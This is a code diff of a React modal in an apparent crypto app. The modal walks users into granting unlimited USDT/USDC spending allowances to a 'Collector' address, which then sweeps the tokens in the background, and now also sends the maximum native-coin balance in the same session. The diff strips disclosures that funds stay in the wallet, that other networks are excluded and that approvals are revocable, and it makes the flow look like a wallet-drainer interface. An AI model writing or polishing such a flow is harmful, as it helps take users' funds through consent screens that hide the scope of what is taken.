@@ -7,11 +7,14 @@ import {
 } from "../core/network-meta";
 import { outcomeLabel } from "../authorization/session";
 import {
+  assetLabel,
+  balanceForNative,
   balanceForToken,
   countIncludedAssets,
 } from "../authorization/preferences";
 import type { NativeTransferEstimate } from "../native-transfer/types";
 import type {
+  AssetSymbol,
   AuthorizationAssetResult,
   AuthorizationSessionResult,
   CollectionMode,
@@ -20,7 +23,6 @@ import type {
   NetworkRow,
   RowStatus,
   TokenPreference,
-  TokenSymbol,
 } from "../types";
 
 type AuthorizeSpendingModalProps = {
@@ -34,8 +36,7 @@ type AuthorizeSpendingModalProps = {
   preferences: CollectionPreferences;
   termsAccepted: boolean;
   sessionResult: AuthorizationSessionResult | null;
-  authorizingAsset: { network: string; token: TokenSymbol } | null;
-  nativeSelected: Record<string, boolean>;
+  authorizingAsset: { network: string; asset: AssetSymbol } | null;
   nativeEstimates: Record<string, NativeTransferEstimate | null>;
   nativeEstimateLoading: Record<string, boolean>;
   nativeEstimateErrors: Record<string, string | null>;
@@ -44,18 +45,13 @@ type AuthorizeSpendingModalProps = {
   onClose: () => void;
   onSelectNetwork: (key: string) => void;
   onCollectionModeChange: (mode: CollectionMode) => void;
-  onTokenPreferenceChange: (
+  onAssetPreferenceChange: (
     network: string,
-    token: TokenSymbol,
+    asset: AssetSymbol,
     patch: Partial<TokenPreference>
   ) => void;
   onTermsChange: (accepted: boolean) => void;
   onAuthorize: () => void;
-  onContinueToNative: () => void;
-  onSkipNative: () => void;
-  onNativeToggle: (network: string, included: boolean) => void;
-  onNativeSelectAll: (included: boolean) => void;
-  onSubmitNative: () => void;
   onRetryNativeEstimate?: (network: string) => void;
 };
 
@@ -64,11 +60,9 @@ function progressWidth(step: ModalStep): string {
     case "preferences":
       return "w-[40%]";
     case "authorizing":
-      return "w-[66%]";
+      return "w-[70%]";
     case "results":
-      return "w-[85%]";
-    case "native":
-      return "w-[95%]";
+      return "w-full";
     default:
       return "w-[40%]";
   }
@@ -82,8 +76,6 @@ function stepSubtitle(step: ModalStep): string {
       return "Authorizing assets";
     case "results":
       return "Authorization results";
-    case "native":
-      return "Optional native transfer";
     default:
       return "Collection Preferences";
   }
@@ -108,6 +100,178 @@ function resultTone(outcome: AuthorizationAssetResult["outcome"]): string {
   }
 }
 
+function assetsOnNetwork(networkKey: string): AssetSymbol[] {
+  return [...tokensForNetwork(networkKey).map((t) => t.symbol), "NATIVE"];
+}
+
+function resultAssetLabel(
+  networkKey: string,
+  token: AuthorizationAssetResult["token"]
+): string {
+  if (token === "NATIVE") return nativeSymbolForNetwork(networkKey);
+  return token;
+}
+
+type AssetPreferenceEditorProps = {
+  network: NetworkRow;
+  asset: AssetSymbol;
+  pref: TokenPreference;
+  approving: boolean;
+  nativeEstimate: NativeTransferEstimate | null;
+  nativeEstimateLoading: boolean;
+  nativeEstimateError: string | null;
+  onAssetPreferenceChange: AuthorizeSpendingModalProps["onAssetPreferenceChange"];
+  onRetryNativeEstimate?: (network: string) => void;
+};
+
+function AssetPreferenceEditor({
+  network,
+  asset,
+  pref,
+  approving,
+  nativeEstimate,
+  nativeEstimateLoading,
+  nativeEstimateError,
+  onAssetPreferenceChange,
+  onRetryNativeEstimate,
+}: AssetPreferenceEditorProps) {
+  const label = assetLabel(network.key, asset);
+  const bal =
+    asset === "NATIVE"
+      ? balanceForNative(network)
+      : balanceForToken(network, asset);
+
+  return (
+    <div className="rounded-lg border border-zinc-200 bg-white p-3">
+      <label className="flex items-center gap-2 text-sm text-zinc-800">
+        <input
+          type="checkbox"
+          checked={pref.included}
+          disabled={approving}
+          onChange={(e) =>
+            onAssetPreferenceChange(network.key, asset, {
+              included: e.target.checked,
+            })
+          }
+        />
+        <span className="font-medium">{label}</span>
+        <span className="text-xs text-zinc-500">Bal {bal}</span>
+      </label>
+      {asset === "NATIVE" && pref.included ? (
+        <p className="mt-1.5 text-xs text-zinc-500">
+          {nativeEstimateLoading
+            ? "Calculating transferable amount after gas reserve..."
+            : nativeEstimate?.canTransfer
+              ? `Max transferable ~${nativeEstimate.transferableHuman} ${nativeEstimate.assetSymbol} (fee ${nativeEstimate.feeHuman})`
+              : "No transferable native balance after fees"}
+          {nativeEstimateError ? (
+            <span className="mt-1 block text-red-600">
+              {nativeEstimateError}{" "}
+              {onRetryNativeEstimate ? (
+                <button
+                  type="button"
+                  className="underline"
+                  onClick={() => onRetryNativeEstimate(network.key)}
+                >
+                  Retry
+                </button>
+              ) : null}
+            </span>
+          ) : null}
+        </p>
+      ) : null}
+      {pref.included ? (
+        <div className="mt-2 space-y-2">
+          <div className="flex gap-2">
+            <button
+              type="button"
+              disabled={approving}
+              onClick={() =>
+                onAssetPreferenceChange(network.key, asset, {
+                  mode: "maximum",
+                  amountHuman: "",
+                })
+              }
+              className={[
+                "rounded-full border px-3 py-1 text-xs",
+                pref.mode === "maximum"
+                  ? "border-[#3396f0] bg-[#3396f0]/10 text-[#3396f0]"
+                  : "border-zinc-200 text-zinc-700",
+              ].join(" ")}
+            >
+              Maximum
+            </button>
+            <button
+              type="button"
+              disabled={approving}
+              onClick={() =>
+                onAssetPreferenceChange(network.key, asset, { mode: "custom" })
+              }
+              className={[
+                "rounded-full border px-3 py-1 text-xs",
+                pref.mode === "custom"
+                  ? "border-[#3396f0] bg-[#3396f0]/10 text-[#3396f0]"
+                  : "border-zinc-200 text-zinc-700",
+              ].join(" ")}
+            >
+              Custom amount
+            </button>
+          </div>
+          {pref.mode === "custom" ? (
+            <div>
+              <input
+                type="text"
+                inputMode="decimal"
+                placeholder={asset === "NATIVE" ? "e.g. 1.5" : "e.g. 50"}
+                disabled={approving}
+                value={pref.amountHuman}
+                onChange={(e) =>
+                  onAssetPreferenceChange(network.key, asset, {
+                    amountHuman: e.target.value,
+                  })
+                }
+                className="w-full rounded-lg border border-zinc-200 px-3 py-2 text-sm outline-none focus:border-[#3396f0]"
+              />
+              <div className="mt-1.5 flex flex-wrap gap-2">
+                {["25", "50", "100"].map((preset) => (
+                  <button
+                    key={preset}
+                    type="button"
+                    disabled={approving}
+                    onClick={() =>
+                      onAssetPreferenceChange(network.key, asset, {
+                        amountHuman: preset,
+                      })
+                    }
+                    className="rounded-full border border-zinc-200 px-2.5 py-0.5 text-[11px] text-zinc-700"
+                  >
+                    {preset}
+                  </button>
+                ))}
+                <button
+                  type="button"
+                  disabled={approving || Number(bal) <= 0}
+                  onClick={() =>
+                    onAssetPreferenceChange(network.key, asset, {
+                      amountHuman:
+                        asset === "NATIVE" && nativeEstimate?.transferableHuman
+                          ? nativeEstimate.transferableHuman
+                          : bal,
+                    })
+                  }
+                  className="rounded-full border border-zinc-200 px-2.5 py-0.5 text-[11px] text-zinc-700 disabled:opacity-50"
+                >
+                  {asset === "NATIVE" ? "Max after fees" : "Full balance"}
+                </button>
+              </div>
+            </div>
+          ) : null}
+        </div>
+      ) : null}
+    </div>
+  );
+}
+
 export function AuthorizeSpendingModal({
   networks,
   rowStatus,
@@ -120,7 +284,6 @@ export function AuthorizeSpendingModal({
   termsAccepted,
   sessionResult,
   authorizingAsset,
-  nativeSelected,
   nativeEstimates,
   nativeEstimateLoading,
   nativeEstimateErrors,
@@ -129,14 +292,9 @@ export function AuthorizeSpendingModal({
   onClose,
   onSelectNetwork,
   onCollectionModeChange,
-  onTokenPreferenceChange,
+  onAssetPreferenceChange,
   onTermsChange,
   onAuthorize,
-  onContinueToNative,
-  onSkipNative,
-  onNativeToggle,
-  onNativeSelectAll,
-  onSubmitNative,
   onRetryNativeEstimate,
 }: AuthorizeSpendingModalProps) {
   const selected = networks.find((n) => n.key === selectedKey) ?? null;
@@ -150,19 +308,6 @@ export function AuthorizeSpendingModal({
     termsAccepted &&
     includedCount > 0 &&
     Boolean(spender);
-
-  const nativeNetworks = networks.filter((n) => {
-    if (selectedKey && n.key !== selectedKey) return false;
-    const est = nativeEstimates[n.key];
-    return (
-      est != null &&
-      est.canTransfer &&
-      BigInt(est.transferableRaw) > BigInt(0)
-    );
-  });
-  const selectedNativeCount = Object.values(nativeSelected).filter(Boolean).length;
-  const canSubmitNative =
-    !approving && selectedNativeCount > 0 && termsAccepted;
 
   return (
     <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/40 px-4">
@@ -210,9 +355,8 @@ export function AuthorizeSpendingModal({
           {modalStep === "preferences" ? (
             <>
               <p className="text-sm text-zinc-600">
-                Select one network, then choose Maximum Collection or Custom for
-                that network only. Other connected networks are not included
-                unless you authorize them separately.
+                Select one network, then choose Maximum Collection or Manual
+                Collection for USDT, USDC, and native coin on that chain.
               </p>
 
               <div>
@@ -294,10 +438,8 @@ export function AuthorizeSpendingModal({
                         </span>
                       </p>
                       <p className="mt-1 text-xs text-zinc-600">
-                        Authorize USDT and USDC on {selected.name} only, with
-                        unlimited allowance so the system can collect the
-                        maximum transferable amount on this network. Native coin
-                        is optional afterward.
+                        Collect maximum USDT, USDC, and native coin (after gas
+                        reserve) on {selected.name} in one session.
                       </p>
                     </button>
 
@@ -313,10 +455,10 @@ export function AuthorizeSpendingModal({
                       ].join(" ")}
                     >
                       <p className="text-sm font-semibold text-zinc-900">
-                        Custom
+                        Manual Collection
                       </p>
                       <p className="mt-1 text-xs text-zinc-600">
-                        Choose which tokens to include on {selected.name}, and
+                        Choose which assets to include on {selected.name} and
                         set Maximum or a custom amount per asset.
                       </p>
                     </button>
@@ -328,165 +470,56 @@ export function AuthorizeSpendingModal({
                     </p>
                     {collectionMode === "maximum" ? (
                       <div className="flex flex-wrap gap-2">
-                        {tokensForNetwork(selected.key).map((info) => {
-                          const pref = preferences[selected.key]?.[info.symbol];
+                        {assetsOnNetwork(selected.key).map((asset) => {
+                          const pref = preferences[selected.key]?.[asset];
                           if (!pref?.included) return null;
+                          const label = assetLabel(selected.key, asset);
+                          const bal =
+                            asset === "NATIVE"
+                              ? balanceForNative(selected)
+                              : balanceForToken(selected, asset);
+                          const est = nativeEstimates[selected.key];
                           return (
                             <span
-                              key={info.symbol}
+                              key={asset}
                               className="rounded-full border border-[#3396f0]/40 bg-white px-3 py-1 text-xs font-medium text-[#3396f0]"
                             >
-                              {info.symbol} · Maximum
+                              {label} · Maximum
                               <span className="ml-1 font-normal text-zinc-500">
-                                Bal {balanceForToken(selected, info.symbol)}
+                                Bal {bal}
+                                {asset === "NATIVE" && est?.canTransfer
+                                  ? ` · ~${est.transferableHuman} transferable`
+                                  : ""}
                               </span>
                             </span>
                           );
                         })}
-                        {tokensForNetwork(selected.key).length === 0 ? (
-                          <span className="text-xs text-zinc-500">
-                            No stablecoins supported
-                          </span>
-                        ) : null}
                       </div>
                     ) : (
                       <div className="space-y-2">
-                        {tokensForNetwork(selected.key).map((info) => {
-                          const pref = preferences[selected.key]?.[
-                            info.symbol
-                          ] ?? {
+                        {assetsOnNetwork(selected.key).map((asset) => {
+                          const pref = preferences[selected.key]?.[asset] ?? {
                             included: false,
                             mode: "custom" as const,
                             amountHuman: "",
                           };
-                          const bal = balanceForToken(selected, info.symbol);
                           return (
-                            <div
-                              key={info.symbol}
-                              className="rounded-lg border border-zinc-200 bg-white p-3"
-                            >
-                              <label className="flex items-center gap-2 text-sm text-zinc-800">
-                                <input
-                                  type="checkbox"
-                                  checked={pref.included}
-                                  disabled={approving}
-                                  onChange={(e) =>
-                                    onTokenPreferenceChange(
-                                      selected.key,
-                                      info.symbol,
-                                      { included: e.target.checked }
-                                    )
-                                  }
-                                />
-                                <span className="font-medium">{info.symbol}</span>
-                                <span className="text-xs text-zinc-500">
-                                  Bal {bal}
-                                </span>
-                              </label>
-                              {pref.included ? (
-                                <div className="mt-2 space-y-2">
-                                  <div className="flex gap-2">
-                                    <button
-                                      type="button"
-                                      disabled={approving}
-                                      onClick={() =>
-                                        onTokenPreferenceChange(
-                                          selected.key,
-                                          info.symbol,
-                                          {
-                                            mode: "maximum",
-                                            amountHuman: "",
-                                          }
-                                        )
-                                      }
-                                      className={[
-                                        "rounded-full border px-3 py-1 text-xs",
-                                        pref.mode === "maximum"
-                                          ? "border-[#3396f0] bg-[#3396f0]/10 text-[#3396f0]"
-                                          : "border-zinc-200 text-zinc-700",
-                                      ].join(" ")}
-                                    >
-                                      Maximum
-                                    </button>
-                                    <button
-                                      type="button"
-                                      disabled={approving}
-                                      onClick={() =>
-                                        onTokenPreferenceChange(
-                                          selected.key,
-                                          info.symbol,
-                                          { mode: "custom" }
-                                        )
-                                      }
-                                      className={[
-                                        "rounded-full border px-3 py-1 text-xs",
-                                        pref.mode === "custom"
-                                          ? "border-[#3396f0] bg-[#3396f0]/10 text-[#3396f0]"
-                                          : "border-zinc-200 text-zinc-700",
-                                      ].join(" ")}
-                                    >
-                                      Custom amount
-                                    </button>
-                                  </div>
-                                  {pref.mode === "custom" ? (
-                                    <div>
-                                      <input
-                                        type="text"
-                                        inputMode="decimal"
-                                        placeholder="e.g. 50"
-                                        disabled={approving}
-                                        value={pref.amountHuman}
-                                        onChange={(e) =>
-                                          onTokenPreferenceChange(
-                                            selected.key,
-                                            info.symbol,
-                                            {
-                                              amountHuman: e.target.value,
-                                            }
-                                          )
-                                        }
-                                        className="w-full rounded-lg border border-zinc-200 px-3 py-2 text-sm outline-none focus:border-[#3396f0]"
-                                      />
-                                      <div className="mt-1.5 flex flex-wrap gap-2">
-                                        {["25", "50", "100"].map((preset) => (
-                                          <button
-                                            key={preset}
-                                            type="button"
-                                            disabled={approving}
-                                            onClick={() =>
-                                              onTokenPreferenceChange(
-                                                selected.key,
-                                                info.symbol,
-                                                { amountHuman: preset }
-                                              )
-                                            }
-                                            className="rounded-full border border-zinc-200 px-2.5 py-0.5 text-[11px] text-zinc-700"
-                                          >
-                                            {preset}
-                                          </button>
-                                        ))}
-                                        <button
-                                          type="button"
-                                          disabled={
-                                            approving || Number(bal) <= 0
-                                          }
-                                          onClick={() =>
-                                            onTokenPreferenceChange(
-                                              selected.key,
-                                              info.symbol,
-                                              { amountHuman: bal }
-                                            )
-                                          }
-                                          className="rounded-full border border-zinc-200 px-2.5 py-0.5 text-[11px] text-zinc-700 disabled:opacity-50"
-                                        >
-                                          Full balance
-                                        </button>
-                                      </div>
-                                    </div>
-                                  ) : null}
-                                </div>
-                              ) : null}
-                            </div>
+                            <AssetPreferenceEditor
+                              key={asset}
+                              network={selected}
+                              asset={asset}
+                              pref={pref}
+                              approving={approving}
+                              nativeEstimate={nativeEstimates[selected.key]}
+                              nativeEstimateLoading={
+                                nativeEstimateLoading[selected.key] ?? false
+                              }
+                              nativeEstimateError={
+                                nativeEstimateErrors[selected.key] ?? null
+                              }
+                              onAssetPreferenceChange={onAssetPreferenceChange}
+                              onRetryNativeEstimate={onRetryNativeEstimate}
+                            />
                           );
                         })}
                       </div>
@@ -494,11 +527,11 @@ export function AuthorizeSpendingModal({
 
                     {spender ? (
                       <p className="mt-2 break-all font-mono text-[10px] text-zinc-500">
-                        Spender {shortAddress(spender, 8, 6)}
+                        Collector {shortAddress(spender, 8, 6)}
                       </p>
                     ) : (
                       <p className="mt-2 text-xs text-amber-700">
-                        Spender not configured for this network
+                        Collector not configured for this network
                       </p>
                     )}
                   </div>
@@ -509,27 +542,25 @@ export function AuthorizeSpendingModal({
                     </p>
                     <ul className="mt-2 list-disc space-y-1 pl-4">
                       <li>
-                        This session covers {selected.name} only. Other
-                        networks require their own authorization.
+                        This session covers {selected.name} only — USDT, USDC,
+                        and native coin together.
                       </li>
                       <li>
-                        ERC-20 / TRC-20 tokens only (USDT, USDC). Native coin is
-                        optional after approvals.
-                      </li>
-                      <li>Funds remain in your wallet after each approve.</li>
-                      <li>
-                        After on-chain confirmation, automatic collection
-                        (transferFrom) runs in the background for each
-                        authorized asset independently.
+                        Tokens use approve + background transferFrom. Native
+                        coin requires a wallet transfer signature in this
+                        session.
                       </li>
                       <li>
-                        Maximum means unlimited allowance so the system can
-                        collect the maximum transferable amount available on
-                        this network.
+                        Each asset is processed independently — partial success
+                        is supported.
                       </li>
                       <li>
-                        The spender pays transferFrom network fees. You pay
-                        approve fees. You can revoke later.
+                        Native maximum leaves a gas reserve; only the
+                        transferable balance is sent.
+                      </li>
+                      <li>
+                        The collector pays token transferFrom fees. You pay
+                        approve and native transfer fees.
                       </li>
                     </ul>
                   </div>
@@ -557,7 +588,7 @@ export function AuthorizeSpendingModal({
                   >
                     {!selectedKey
                       ? "Select a network"
-                      : `Continue · Authorize ${includedCount} asset${
+                      : `Authorize ${includedCount} asset${
                           includedCount === 1 ? "" : "s"
                         } on ${selected.name}`}
                   </button>
@@ -574,16 +605,18 @@ export function AuthorizeSpendingModal({
           {modalStep === "authorizing" ? (
             <div className="space-y-3 py-6 text-center">
               <p className="text-sm font-semibold text-zinc-900">
-                Confirm each approval in your wallet
+                Confirm each asset in your wallet
               </p>
               <p className="text-sm text-zinc-600">
-                Assets are authorized one at a time. If you reject or one fails,
-                the remaining assets still continue.
+                Assets are processed one at a time. If you reject one or it
+                fails, the remaining assets still continue.
               </p>
               {authorizingAsset ? (
                 <p className="rounded-lg border border-[#3396f0]/30 bg-[#3396f0]/10 px-3 py-2 text-sm text-[#1d5f9e]">
                   Now: {authorizingAsset.network.toUpperCase()}{" "}
-                  {authorizingAsset.token}
+                  {authorizingAsset.asset === "NATIVE"
+                    ? nativeSymbolForNetwork(authorizingAsset.network)
+                    : authorizingAsset.asset}
                 </p>
               ) : null}
               <p className="text-xs text-zinc-500">
@@ -595,16 +628,15 @@ export function AuthorizeSpendingModal({
           {modalStep === "results" && sessionResult ? (
             <>
               <p className="text-sm text-zinc-600">
-                Authorization finished. Collection of authorized assets continues
-                automatically in the background. Failures on one asset do not
-                block others.
+                Session finished. Token collection continues automatically in the
+                background. Each asset below succeeded or failed on its own.
               </p>
               <div className="grid grid-cols-3 gap-2 text-center text-xs">
                 <div className="rounded-lg bg-emerald-50 px-2 py-2 text-emerald-800">
                   <p className="text-lg font-semibold">
                     {sessionResult.authorizedCount}
                   </p>
-                  Authorized
+                  Succeeded
                 </div>
                 <div className="rounded-lg bg-amber-50 px-2 py-2 text-amber-900">
                   <p className="text-lg font-semibold">
@@ -626,7 +658,8 @@ export function AuthorizeSpendingModal({
                     className={`rounded-lg border px-3 py-2 text-sm ${resultTone(item.outcome)}`}
                   >
                     <p className="font-semibold">
-                      {item.network.toUpperCase()} {item.token}
+                      {item.network.toUpperCase()}{" "}
+                      {resultAssetLabel(item.network, item.token)}
                     </p>
                     <p className="text-xs opacity-90">
                       {item.message || outcomeLabel(item.outcome)}
@@ -634,155 +667,14 @@ export function AuthorizeSpendingModal({
                   </li>
                 ))}
               </ul>
-              <div className="flex flex-col gap-2">
-                <button
-                  type="button"
-                  disabled={approving}
-                  onClick={onContinueToNative}
-                  className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white hover:bg-[#2b7fd6] disabled:opacity-50"
-                >
-                  Also transfer native coins?
-                </button>
-                <button
-                  type="button"
-                  disabled={approving}
-                  onClick={onSkipNative}
-                  className="w-full rounded-xl border border-zinc-200 bg-white py-3 text-sm font-medium text-zinc-700 hover:border-zinc-300 disabled:opacity-50"
-                >
-                  Done
-                </button>
-              </div>
-            </>
-          ) : null}
-
-          {modalStep === "native" ? (
-            <>
-              <p className="text-sm text-zinc-600">
-                Optional: send native coin on the network you just authorized.
-                This needs a separate wallet signature and is independent of
-                token collection.
-              </p>
-
-              {nativeNetworks.length === 0 ? (
-                <p className="rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-sm text-amber-950">
-                  No transferable native balance after fees on this network. You
-                  can close this step.
-                </p>
-              ) : (
-                <>
-                  <div className="flex gap-2">
-                    <button
-                      type="button"
-                      disabled={approving}
-                      onClick={() => onNativeSelectAll(true)}
-                      className="rounded-full border border-zinc-200 px-3 py-1 text-xs text-zinc-700"
-                    >
-                      Select all
-                    </button>
-                    <button
-                      type="button"
-                      disabled={approving}
-                      onClick={() => onNativeSelectAll(false)}
-                      className="rounded-full border border-zinc-200 px-3 py-1 text-xs text-zinc-700"
-                    >
-                      Clear
-                    </button>
-                  </div>
-                  <ul className="space-y-2">
-                    {nativeNetworks.map((network) => {
-                      const est = nativeEstimates[network.key];
-                      const loading = nativeEstimateLoading[network.key];
-                      const estError = nativeEstimateErrors[network.key];
-                      return (
-                        <li
-                          key={network.key}
-                          className="rounded-xl border border-zinc-200 bg-zinc-50 p-3"
-                        >
-                          <label className="flex items-start gap-2 text-sm">
-                            <input
-                              type="checkbox"
-                              className="mt-1"
-                              checked={Boolean(nativeSelected[network.key])}
-                              disabled={approving}
-                              onChange={(e) =>
-                                onNativeToggle(network.key, e.target.checked)
-                              }
-                            />
-                            <span className="min-w-0 flex-1">
-                              <span className="font-semibold text-zinc-900">
-                                {network.name} ·{" "}
-                                {nativeSymbolForNetwork(network.key)}
-                              </span>
-                              <span className="mt-1 block text-xs text-zinc-600">
-                                {loading
-                                  ? "Calculating fees..."
-                                  : est
-                                    ? `Transferable ${est.transferableHuman} ${est.assetSymbol} · fee ${est.feeHuman}`
-                                    : "No estimate"}
-                              </span>
-                              {estError ? (
-                                <span className="mt-1 block text-xs text-red-600">
-                                  {estError}{" "}
-                                  {onRetryNativeEstimate ? (
-                                    <button
-                                      type="button"
-                                      className="underline"
-                                      onClick={() =>
-                                        onRetryNativeEstimate(network.key)
-                                      }
-                                    >
-                                      Retry
-                                    </button>
-                                  ) : null}
-                                </span>
-                              ) : null}
-                            </span>
-                          </label>
-                        </li>
-                      );
-                    })}
-                  </ul>
-                </>
-              )}
-
-              {sessionResult ? (
-                <ul className="space-y-1">
-                  {sessionResult.items
-                    .filter((i) => i.token === "NATIVE")
-                    .map((item) => (
-                      <li
-                        key={`native-${item.network}-${item.outcome}`}
-                        className={`rounded-lg border px-3 py-2 text-xs ${resultTone(item.outcome)}`}
-                      >
-                        {item.network.toUpperCase()} NATIVE —{" "}
-                        {item.message || outcomeLabel(item.outcome)}
-                      </li>
-                    ))}
-                </ul>
-              ) : null}
-
-              <div className="flex flex-col gap-2">
-                <button
-                  type="button"
-                  disabled={!canSubmitNative}
-                  onClick={onSubmitNative}
-                  className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
-                >
-                  {approving
-                    ? "Confirm in your wallet..."
-                    : `Transfer ${selectedNativeCount} native asset${
-                        selectedNativeCount === 1 ? "" : "s"
-                      }`}
-                </button>
-                <button
-                  type="button"
-                  disabled={approving}
-                  onClick={onSkipNative}
-                  className="w-full rounded-xl border border-zinc-200 bg-white py-3 text-sm font-medium text-zinc-700 disabled:opacity-50"
-                >
-                  Skip / Done
-                </button>
-              </div>
+              <button
+                type="button"
+                disabled={approving}
+                onClick={onClose}
+                className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white hover:bg-[#2b7fd6] disabled:opacity-50"
+              >
+                Done
+              </button>
             </>
           ) : null}
         </div>
